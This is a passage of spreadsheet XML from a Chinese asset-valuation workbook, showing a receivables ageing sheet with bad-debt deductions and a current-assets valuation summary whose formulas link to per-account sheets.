      <c r="G17" s="380" t="n"/>
      <c r="H17" s="566" t="n"/>
      <c r="I17" s="380" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-J17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(J17=0,"",L17/J17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="587" t="n"/>
      <c r="F18" s="380">
        <f>IF(E18="","",LOOKUP(DATEDIF(E18,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="566" t="n"/>
      <c r="I18" s="380" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-J18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(J18=0,"",L18/J18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="587" t="n"/>
      <c r="F19" s="380">
        <f>IF(E19="","",LOOKUP(DATEDIF(E19,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="566" t="n"/>
      <c r="I19" s="380" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-J19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(J19=0,"",L19/J19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="587" t="n"/>
      <c r="F20" s="380">
        <f>IF(E20="","",LOOKUP(DATEDIF(E20,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="566" t="n"/>
      <c r="I20" s="380" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-J20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(J20=0,"",L20/J20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="587" t="n"/>
      <c r="F21" s="380">
        <f>IF(E21="","",LOOKUP(DATEDIF(E21,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="566" t="n"/>
      <c r="I21" s="380" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-J21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(J21=0,"",L21/J21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="587" t="n"/>
      <c r="F22" s="380">
        <f>IF(E22="","",LOOKUP(DATEDIF(E22,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="566" t="n"/>
      <c r="I22" s="380" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-J22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(J22=0,"",L22/J22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="587" t="n"/>
      <c r="F23" s="380">
        <f>IF(E23="","",LOOKUP(DATEDIF(E23,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="566" t="n"/>
      <c r="I23" s="380" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-J23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(J23=0,"",L23/J23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="587" t="n"/>
      <c r="F24" s="380">
        <f>IF(E24="","",LOOKUP(DATEDIF(E24,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="566" t="n"/>
      <c r="I24" s="380" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-J24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(J24=0,"",L24/J24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="587" t="n"/>
      <c r="F25" s="380">
        <f>IF(E25="","",LOOKUP(DATEDIF(E25,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="566" t="n"/>
      <c r="I25" s="380" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-J25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(J25=0,"",L25/J25*100)</f>
        <v/>
      </c>
      <c r="N25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="587" t="n"/>
      <c r="F26" s="380">
        <f>IF(E26="","",LOOKUP(DATEDIF(E26,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="566" t="n"/>
      <c r="I26" s="380" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555">
        <f>K26-J26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(J26=0,"",L26/J26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="115" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="580">
        <f>ROUND(SUM(H6:H26),2)</f>
        <v/>
      </c>
      <c r="I27" s="380" t="n"/>
      <c r="J27" s="555">
        <f>ROUND(SUM(J6:J26),2)</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>ROUND(SUM(K6:K26),2)</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>K27-J27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(J27=0,"",L27/J27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B28" s="185" t="inlineStr">
        <is>
          <t>减：其他应收款坏账准备</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="115" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="380" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555">
        <f>K28-J28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(J28=0,"",L28/J28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>预计损失</t>
        </is>
      </c>
      <c r="B29" s="185" t="inlineStr">
        <is>
          <t>减：其他应收款预计损失</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="380" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="380" t="n"/>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555" t="n"/>
      <c r="L29" s="555">
        <f>K29-J29</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>IF(J29=0,"",L29/J29*100)</f>
        <v/>
      </c>
      <c r="N29" s="383" t="n"/>
    </row>
    <row r="30" ht="16.5" customHeight="1" s="415">
      <c r="A30" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B30" s="380" t="inlineStr">
        <is>
          <t>合     计</t>
        </is>
      </c>
      <c r="C30" s="567" t="n"/>
      <c r="D30" s="383" t="n"/>
      <c r="E30" s="115" t="n"/>
      <c r="F30" s="383" t="n"/>
      <c r="G30" s="383" t="n"/>
      <c r="H30" s="580">
        <f>ROUND(H27-H28,2)</f>
        <v/>
      </c>
      <c r="I30" s="383" t="n"/>
      <c r="J30" s="555">
        <f>ROUND(J27-J28,2)</f>
        <v/>
      </c>
      <c r="K30" s="555">
        <f>ROUND(K27-K29,2)</f>
        <v/>
      </c>
      <c r="L30" s="555">
        <f>K30-J30</f>
        <v/>
      </c>
      <c r="M30" s="555">
        <f>IF(J30=0,"",L30/J30*100)</f>
        <v/>
      </c>
      <c r="N30" s="383" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="B30:C30"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B2:N2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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7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 codeName="Sheet9">
    <tabColor rgb="FF7030A0"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:Q83"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="E10" sqref="E10"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="10" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="31.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="21.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="18.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="16.1666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="17.3333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="9" customWidth="1" style="410" min="8" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="371" t="inlineStr">
        <is>
          <t>流动资产余额评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="17.25" customHeight="1" s="415">
      <c r="A2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="H2" s="376" t="n"/>
      <c r="I2" s="376" t="n"/>
      <c r="J2" s="376" t="n"/>
      <c r="K2" s="376" t="n"/>
      <c r="L2" s="376" t="n"/>
      <c r="M2" s="376" t="n"/>
      <c r="N2" s="376" t="n"/>
      <c r="O2" s="376" t="n"/>
      <c r="P2" s="376" t="n"/>
    </row>
    <row r="3" ht="14" customFormat="1" customHeight="1" s="116">
      <c r="A3" s="376" t="n"/>
      <c r="B3" s="376" t="n"/>
      <c r="C3" s="376" t="n"/>
      <c r="D3" s="376" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="548" t="inlineStr">
        <is>
          <t>表3</t>
        </is>
      </c>
      <c r="H3" s="376" t="n"/>
      <c r="I3" s="376" t="n"/>
      <c r="J3" s="376" t="n"/>
      <c r="K3" s="376" t="n"/>
      <c r="L3" s="376" t="n"/>
      <c r="M3" s="376" t="n"/>
      <c r="N3" s="376" t="n"/>
      <c r="O3" s="376" t="n"/>
      <c r="P3" s="376" t="n"/>
    </row>
    <row r="4" ht="21" customFormat="1" customHeight="1" s="116">
      <c r="A4" s="563">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="E4" s="329" t="n"/>
      <c r="F4" s="329" t="n"/>
      <c r="G4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N4" s="376" t="n"/>
      <c r="O4" s="376" t="n"/>
      <c r="P4" s="376" t="n"/>
    </row>
    <row r="5" ht="21" customFormat="1" customHeight="1" s="373">
      <c r="A5" s="380" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="D5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c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</row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A6" s="331" t="inlineStr">
        <is>
          <t>3-4-1</t>
        </is>
      </c>
      <c r="B6" s="96" t="inlineStr">
        <is>
          <t>应票余额</t>
        </is>
      </c>
      <c r="C6" s="97" t="inlineStr">
        <is>
          <t>应收票据余额</t>
        </is>
      </c>
      <c r="D6" s="590">
        <f>'3-4应收票据'!G26</f>
        <v/>
      </c>
      <c r="E6" s="590">
        <f>'3-4应收票据'!H26</f>
        <v/>
      </c>
      <c r="F6" s="590">
        <f>E6-D6</f>
        <v/>
      </c>
      <c r="G6" s="590">
        <f>IF(D6=0,"",F6/D6*100)</f>
        <v/>
      </c>
      <c r="H6" s="347" t="n"/>
      <c r="I6" s="347" t="n"/>
      <c r="J6" s="347" t="n"/>
      <c r="K6" s="347" t="n"/>
      <c r="L6" s="347" t="n"/>
      <c r="M6" s="347" t="n"/>
      <c r="N6" s="347" t="n"/>
      <c r="O6" s="347" t="n"/>
      <c r="P6" s="347" t="n"/>
      <c r="Q6" s="399" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A7" s="331" t="inlineStr">
        <is>
          <t>3-5-1</t>
        </is>
      </c>
      <c r="B7" s="96" t="inlineStr">
        <is>
          <t>应收余额</t>
        </is>
      </c>
      <c r="C7" s="97" t="inlineStr">
        <is>
          <t>应收账款余额</t>
        </is>
      </c>
      <c r="D7" s="590">
        <f>'3-5应收账款'!J26</f>
        <v/>
      </c>
      <c r="E7" s="590">
        <f>'3-5应收账款'!K26</f>
        <v/>
      </c>
      <c r="F7" s="590">
        <f>E7-D7</f>
        <v/>
      </c>
      <c r="G7" s="590">
        <f>IF(D7=0,"",F7/D7*100)</f>
        <v/>
      </c>
      <c r="H7" s="347" t="n"/>
      <c r="I7" s="347" t="n"/>
      <c r="J7" s="347" t="n"/>
      <c r="K7" s="347" t="n"/>
      <c r="L7" s="347" t="n"/>
      <c r="M7" s="347" t="n"/>
      <c r="N7" s="347" t="n"/>
      <c r="O7" s="347" t="n"/>
      <c r="P7" s="347" t="n"/>
      <c r="Q7" s="399" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A8" s="331" t="inlineStr">
        <is>
          <t>3-6-1</t>
        </is>
      </c>
      <c r="B8" s="96" t="inlineStr">
        <is>
          <t>应融余额</t>
        </is>
      </c>
      <c r="C8" s="97" t="inlineStr">
        <is>
          <t>应收款项融资</t>
        </is>
      </c>
      <c r="D8" s="590">
        <f>'3-6应收款项融资'!J26</f>
        <v/>
      </c>
      <c r="E8" s="590">
        <f>'3-6应收款项融资'!K26</f>
        <v/>
      </c>
      <c r="F8" s="590">
        <f>E8-D8</f>
        <v/>
      </c>
      <c r="G8" s="590">
        <f>IF(D8=0,"",F8/D8*100)</f>
        <v/>
      </c>
      <c r="H8" s="347" t="n"/>
      <c r="I8" s="347" t="n"/>
      <c r="J8" s="347" t="n"/>
      <c r="K8" s="347" t="n"/>
      <c r="L8" s="347" t="n"/>
      <c r="M8" s="347" t="n"/>
      <c r="N8" s="347" t="n"/>
      <c r="O8" s="347" t="n"/>
      <c r="P8" s="347" t="n"/>
      <c r="Q8" s="399" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A9" s="331" t="inlineStr">
        <is>
          <t>3-7-1</t>
        </is>
      </c>
      <c r="B9" s="96" t="inlineStr">
        <is>
          <t>预付余额</t>
        </is>
      </c>
      <c r="C9" s="97" t="inlineStr">
        <is>
          <t>预付账款余额</t>
        </is>
      </c>
      <c r="D9" s="590">
        <f>'3-7预付款项'!J26</f>
        <v/>
      </c>
      <c r="E9" s="590">
        <f>'3-7预付款项'!K26</f>
        <v/>
      </c>
      <c r="F9" s="590">
        <f>E9-D9</f>
        <v/>
      </c>
      <c r="G9" s="590">
        <f>IF(D9=0,"",F9/D9*100)</f>
        <v/>
      </c>
      <c r="H9" s="347" t="n"/>
      <c r="I9" s="347" t="n"/>
      <c r="J9" s="347" t="n"/>
      <c r="K9" s="347" t="n"/>
      <c r="L9" s="347" t="n"/>
      <c r="M9" s="347" t="n"/>
      <c r="N9" s="347" t="n"/>
      <c r="O9" s="347" t="n"/>
      <c r="P9" s="347" t="n"/>
      <c r="Q9" s="399" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A10" s="331" t="inlineStr">
        <is>
          <t>3-8-1</t>
        </is>
      </c>
      <c r="B10" s="96" t="inlineStr">
        <is>
          <t>他收余额</t>
        </is>
      </c>
      <c r="C10" s="97" t="inlineStr">
        <is>
          <t>其他应收款余额</t>
        </is>
      </c>
      <c r="D10" s="590">
        <f>'3-8-3其他应收款'!J27</f>
        <v/>
      </c>
      <c r="E10" s="590">
        <f>'3-8-3其他应收款'!K27</f>
        <v/>
      </c>
      <c r="F10" s="590">
        <f>E10-D10</f>
        <v/>
      </c>
      <c r="G10" s="590">
        <f>IF(D10=0,"",F10/D10*100)</f>
        <v/>
      </c>
      <c r="H10" s="347" t="n"/>
      <c r="I10" s="347" t="n"/>
      <c r="J10" s="347" t="n"/>
      <c r="K10" s="347" t="n"/>
      <c r="L10" s="347" t="n"/>
      <c r="M10" s="347" t="n"/>
      <c r="N10" s="347" t="n"/>
      <c r="O10" s="347" t="n"/>
      <c r="P10" s="347" t="n"/>
      <c r="Q10" s="399" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A11" s="331" t="inlineStr">
        <is>
          <t>3-9-1</t>
        </is>
      </c>
      <c r="B11" s="96" t="inlineStr">
        <is>
          <t>存货采购</t>
        </is>
      </c>
      <c r="C11" s="97" t="inlineStr">
        <is>
          <t>在途物资余额</t>
        </is>
      </c>
      <c r="D11" s="590">
        <f>'3-9-1在途物资'!G26</f>
        <v/>
      </c>
      <c r="E11" s="590">
        <f>'3-9-1在途物资'!J26</f>
        <v/>
      </c>
      <c r="F11" s="590">
        <f>E11-D11</f>
        <v/>
      </c>
      <c r="G11" s="590">
        <f>IF(D11=0,"",F11/D11*100)</f>
        <v/>
      </c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7" t="n"/>
      <c r="Q11" s="399" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A12" s="331" t="inlineStr">
        <is>
          <t>3-9-2</t>
        </is>
      </c>
      <c r="B12" s="96" t="inlineStr">
        <is>
          <t>存货原材</t>
        </is>
      </c>
      <c r="C12" s="97" t="inlineStr">
        <is>
          <t>原材料余额</t>
        </is>
      </c>
      <c r="D12" s="590">
        <f>'3-9-2原材料'!H26</f>
        <v/>
      </c>
      <c r="E12" s="590">
        <f>'3-9-2原材料'!K26</f>
        <v/>
      </c>
      <c r="F12" s="590">
        <f>E12-D12</f>
        <v/>
      </c>
      <c r="G12" s="590">
        <f>IF(D12=0,"",F12/D12*100)</f>
        <v/>
      </c>
      <c r="H12" s="347" t="n"/>
      <c r="I12" s="347" t="n"/>
      <c r="J12" s="347" t="n"/>
      <c r="K12" s="347" t="n"/>
      <c r="L12" s="347" t="n"/>
      <c r="M12" s="347" t="n"/>
      <c r="N12" s="347" t="n"/>
      <c r="O12" s="347" t="n"/>
      <c r="P12" s="347" t="n"/>
      <c r="Q12" s="399" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A13" s="331" t="inlineStr">
        <is>
          <t>3-9-3</t>
        </is>
      </c>
      <c r="B13" s="96" t="inlineStr">
        <is>
          <t>存货在库</t>
        </is>
      </c>
      <c r="C13" s="97" t="inlineStr">
        <is>
          <t>在库周转材料余额</t>
        </is>
      </c>
      <c r="D13" s="590">
        <f>'3-9-3在库周转材料'!H26</f>
        <v/>
      </c>
      <c r="E13" s="590">
        <f>'3-9-3在库周转材料'!K26</f>
        <v/>
      </c>
      <c r="F13" s="590">
        <f>E13-D13</f>
        <v/>
      </c>
      <c r="G13" s="590">
        <f>IF(D13=0,"",F13/D13*100)</f>
        <v/>
      </c>
      <c r="H13" s="347" t="n"/>
      <c r="I13" s="347" t="n"/>
      <c r="J13" s="347" t="n"/>
      <c r="K13" s="347" t="n"/>
      <c r="L13" s="347" t="n"/>
      <c r="M13" s="347" t="n"/>
      <c r="N13" s="347" t="n"/>
      <c r="O13" s="347" t="n"/>
      <c r="P13" s="347" t="n"/>
      <c r="Q13" s="399" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A14" s="331" t="inlineStr">
        <is>
          <t>3-9-4</t>
        </is>
      </c>
      <c r="B14" s="96" t="inlineStr">
        <is>
          <t>存货委加</t>
        </is>
      </c>
      <c r="C14" s="97" t="inlineStr">
        <is>
          <t>委托加工物资余额</t>
        </is>
      </c>
      <c r="D14" s="590">
        <f>'3-9-4委托加工物资'!H26</f>
        <v/>
      </c>
      <c r="E14" s="590">
        <f>'3-9-4委托加工物资'!K26</f>
        <v/>
      </c>
      <c r="F14" s="590">
        <f>E14-D14</f>
        <v/>
      </c>
      <c r="G14" s="590">
        <f>IF(D14=0,"",F14/D14*100)</f>
        <v/>
      </c>
      <c r="H14" s="347" t="n"/>
      <c r="I14" s="347" t="n"/>
      <c r="J14" s="347" t="n"/>
      <c r="K14" s="347" t="n"/>
      <c r="L14" s="347" t="n"/>
      <c r="M14" s="347" t="n"/>
      <c r="N14" s="347" t="n"/>
      <c r="O14" s="347" t="n"/>
      <c r="P14" s="347" t="n"/>
      <c r="Q14" s="399" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A15" s="331" t="inlineStr">
        <is>
          <t>3-9-5</t>
        </is>
      </c>
      <c r="B15" s="96" t="inlineStr">
        <is>
          <t>存货产成</t>
        </is>
      </c>
      <c r="C15" s="97" t="inlineStr">
        <is>
          <t>产成品（库存商品）余额</t>
        </is>
      </c>
      <c r="D15" s="590">
        <f>'3-9-5产成品（库存商品）'!H26</f>
        <v/>
      </c>
      <c r="E15" s="590">
        <f>'3-9-5产成品（库存商品）'!L26</f>
        <v/>
      </c>
      <c r="F15" s="590">
        <f>E15-D15</f>
        <v/>
      </c>
      <c r="G15" s="590">
        <f>IF(D15=0,"",F15/D15*100)</f>
        <v/>
      </c>
      <c r="H15" s="347" t="n"/>
      <c r="I15" s="347" t="n"/>
      <c r="J15" s="347" t="n"/>
      <c r="K15" s="347" t="n"/>
      <c r="L15" s="347" t="n"/>
      <c r="M15" s="347" t="n"/>
      <c r="N15" s="347" t="n"/>
      <c r="O15" s="347" t="n"/>
      <c r="P15" s="347" t="n"/>
      <c r="Q15" s="399" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A16" s="331" t="inlineStr">
        <is>
          <t>3-9-6</t>
        </is>
      </c>
      <c r="B16" s="96" t="inlineStr">
        <is>
          <t>存货在产</t>
        </is>
      </c>
      <c r="C16" s="97" t="inlineStr">
        <is>
          <t>在产品（自制半成品）余额</t>
        </is>
      </c>
      <c r="D16" s="590">
        <f>'3-9-6在产品（自制半成品）'!H26</f>
        <v/>
      </c>
      <c r="E16" s="590">
        <f>'3-9-6在产品（自制半成品）'!K26</f>
        <v/>
      </c>
      <c r="F16" s="590">
        <f>E16-D16</f>
        <v/>
      </c>
      <c r="G16" s="590">
        <f>IF(D16=0,"",F16/D16*100)</f>
        <v/>
      </c>
      <c r="H16" s="347" t="n"/>
      <c r="I16" s="347" t="n"/>
      <c r="J16" s="347" t="n"/>
      <c r="K16" s="347" t="n"/>
      <c r="L16" s="347" t="n"/>
      <c r="M16" s="347" t="n"/>
      <c r="N16" s="347" t="n"/>
      <c r="O16" s="347" t="n"/>
      <c r="P16" s="347" t="n"/>
      <c r="Q16" s="399" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A17" s="331" t="inlineStr">
        <is>
          <t>3-9-7</t>
        </is>
      </c>
      <c r="B17" s="96" t="inlineStr">
        <is>
          <t>存货发出</t>
        </is>
      </c>
      <c r="C17" s="97" t="inlineStr">
        <is>
          <t>发出商品余额</t>
        </is>
      </c>
      <c r="D17" s="590">
        <f>'3-9-7发出商品'!H26</f>
        <v/>
      </c>
      <c r="E17" s="590">
        <f>'3-9-7发出商品'!K26</f>
        <v/>
      </c>
      <c r="F17" s="590">
        <f>E17-D17</f>
        <v/>
      </c>
      <c r="G17" s="590">
        <f>IF(D17=0,"",F17/D17*100)</f>
        <v/>
      </c>
      <c r="H17" s="347" t="n"/>
      <c r="I17" s="347" t="n"/>
      <c r="J17" s="347" t="n"/>
      <c r="K17" s="347" t="n"/>
      <c r="L17" s="347" t="n"/>
      <c r="M17" s="347" t="n"/>
      <c r="N17" s="347" t="n"/>
      <c r="O17" s="347" t="n"/>
      <c r="P17" s="347" t="n"/>
      <c r="Q17" s="399" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="389">
      <c r="A18" s="331" t="inlineStr">
        <is>
          <t>3-9-8</t>
        </is>
      </c>
      <c r="B18" s="96" t="inlineStr">
        <is>
          <t>存货在用</t>
        </is>
      </c>
      <c r="C18" s="97" t="inlineStr">
        <is>
          <t>在用周转材料余额</t>
        </is>
      </c>
      <c r="D18" s="590">
        <f>'3-9-8在用周转材料'!H26</f>
        <v/>
      </c>
      <c r="E18" s="590">
        <f>'3-9-8在用周转材料'!L26</f>
        <v/>
      </c>
      <c r="F18" s="590">
        <f>E18-D18</f>
        <v/>
      </c>
      <c r="G18" s="590">
        <f>IF(D18=0,"",F18/D18*100)</f>
        <v/>
      </c>
      <c r="H18" s="347" t="n"/>
      <c r="I18" s="347" t="n"/>
      <c r="J18" s="347" t="n"/>
      <c r="K18" s="347" t="n"/>
      <c r="L18" s="347" t="n"/>
      <c r="M18" s="347" t="n"/>
      <c r="N18" s="347" t="n"/>
      <c r="O18" s="347" t="n"/>
